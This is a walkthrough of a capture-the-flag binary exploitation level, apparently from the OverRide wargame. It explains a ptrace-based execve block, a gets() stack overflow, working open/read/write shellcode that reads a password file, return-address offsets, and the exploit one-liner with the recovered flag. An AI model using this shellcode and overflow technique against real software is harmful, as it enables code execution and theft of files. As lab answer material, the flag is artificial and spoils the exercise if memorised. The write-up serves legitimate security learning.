1. Basically, when the child process send a signal to the parent process, it goes out of the while loop.

Either the status is an error signal (like segfault or so), the parent process goes to the `puts("child is exiting...")` line.

Either the signal is of another sort and it goes into the `ptrace` line of code.

If the signal is `SIGTRAP`, it means the child process has called an `execve` command on a program. This gives a chance to the parent process to make some actions before the program is executed. Here, the parent process decides to print `"no exec() for you"` and to kill its own pid, terminating the program.

2. The child process calls `gets` function on a buffer with no length protection. So we could erase the next instruction of the calling function, which is stored on the stack at `$ebp + 0x4`.
But our shellcode calls `execve("/bin/sh")`; so the program terminates with the string "no exec() for you".

Hence we need a shellcode which does not call the `execve` syscall.

The trick is to call a shellcode which open, read, and write on stdout the content of the file `/home/users/level05/.pass`.

[Here is one.](http://shell-storm.org/shellcode/files/shellcode-73.php)

3. The exploit:

    - We create a new environment variable containing our shellcode with open/read/write syscalls on level05/.pass file. We set several NOP instructions in front to take into account the discrepency in memory addresses that we have between gdb and outside of gdb:

    ```
    export SHELLCODE=`python -c 'print "\x90"*20 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass"'`
    ```

    - We launch `gdb ./level05`, breakpoint at beginning of function main, and at breakpoint launch the command `x/30s (*(char**)environ) to get a list of the first env variables.

    - We find our `SHELLCODE` variable and its address `0xffffd834` (WATCH OUT: this address might be different on different shell sessions).

    - Find the offset : we know $esp is at `184 bytes` from $ebp (cf beginning of main => `$ebp - 0x8` for alignment and then `$esp-0xb0`). We know that the buffer is located at `$esp+0x20` = `154 bytes` from $ebp. so the offset to The location of $eip of the calling function is `156 bytes` ($ebp+0x4).

    - We can pass our exploit script to the program (adding 16 bytes to the address of the env variable, to end up in the NOP suite of instructions):

    ```
    level04@OverRide:~$ (python -c 'print("A" * 156 + "\x44\xd8\xff\xff")') | ./level04
    Give me some shellcode, k
    3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
    child is exiting...
    ```